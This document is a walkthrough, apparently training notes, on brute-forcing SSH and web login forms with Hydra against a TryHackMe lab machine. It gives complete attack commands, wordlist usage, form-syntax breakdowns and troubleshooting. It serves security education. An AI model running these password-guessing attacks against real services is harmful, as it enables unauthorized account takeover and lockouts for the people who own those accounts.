# Hydra Walkthrough — Brute Forcing SSH & Web Login Forms

## Tool Overview

Hydra is an online password cracking tool — it attacks a *live* service directly (SSH, FTP, RDP, HTTP forms, etc.), as opposed to offline tools like John the Ripper that operate against a static hash file. This makes Hydra slower and detectable, but useful when no hash is available — only a live login interface.

Installed by default on Kali Linux. On other distributions:
```bash
sudo apt install hydra      # Debian/Ubuntu
dnf install hydra       # Fedora
```

---

## Brute Forcing SSH

### Command

```bash
hydra -l <username> -P <wordlist_path> <target_ip> -t 4 ssh
```

### Option Breakdown

| Option | Meaning |
|---|---|
| `-l` | Specifies a single, known username |
| `-P` | Path to a password wordlist |
| `-t` | Number of parallel threads (4 is a reasonable default; higher risks instability/lockout) |
| `ssh` | Target service/protocol |

### Custom Brute Force Range (no wordlist)

For numeric PINs or small known character sets, Hydra can generate combinations directly:

```bash
hydra -l admin -x 4:4:0123456789 ssh://<target_ip>
```

`-x min:max:charset` defines the minimum length, maximum length, and character set — avoiding the need for a pre-built wordlist file.

### Tested Example

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt <MACHINE_IP> -t 4 ssh
```

On success, Hydra outputs the matched credentials directly in the terminal. The discovered password is then used to log in normally:

```bash
ssh molly@<MACHINE_IP>
```

---

## Brute Forcing a Web Login Form (HTTP POST)

Web forms require more setup since Hydra needs to know exactly what the login request looks like. This information is obtained by inspecting the form in the browser's Developer Tools (Network tab) or page source before running any attack.

### Command Structure

```bash
hydra -l <username> -P <wordlist> <target_ip> http-post-form "<path>:<login_data>:<failure_string>" -V
```

### Breaking Down the Three Colon-Separated Parts

**1. Path** — the URL of the login page (e.g. `/` for the homepage, or `/login.php`)

**2. Login data (POST body)** — the exact field names used by the form, with `^USER^` and `^PASS^` as placeholders that Hydra substitutes on every attempt:
```
username=^USER^&password=^PASS^
```

**3. Failure condition** — a string that appears in the page response specifically when login fails, prefixed with `F=`:
```
F=incorrect
```
(The opposite, `S=`, can be used instead if a known success string is more reliable.)

`-V` enables verbose mode, printing every individual attempt — useful for confirming the field names and failure string are correct (if every attempt returns the same generic response, the field names are likely wrong).

### Tested Example

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt <MACHINE_IP> http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

### Non-Default Port

If the web server runs on a custom port:
```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt <MACHINE_IP> http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V
```

---

## Common Issues & Troubleshooting

| Issue | Cause | Fix |
|---|---|---|
| Wordlist not found | `rockyou.txt` ships gzipped on Kali | `gunzip /usr/share/wordlists/rockyou.txt.gz` |
| Target unreachable | VPN not connected (TryHackMe rooms) | Connect to TryHackMe VPN before running Hydra |
| All attempts "fail" identically | Wrong form field names or wrong failure string | Manually submit one wrong login in the browser and inspect the exact response text |
| Used `192.168.x.0` as target | This is a network address, not a host | Use the actual assigned machine IP, not the subnet base |

---

## Lab Source

Exercises in this walkthrough were performed against TryHackMe's Hydra room (deployed lab machine), targeting both an SSH service and a web login form, under explicit lab authorization.
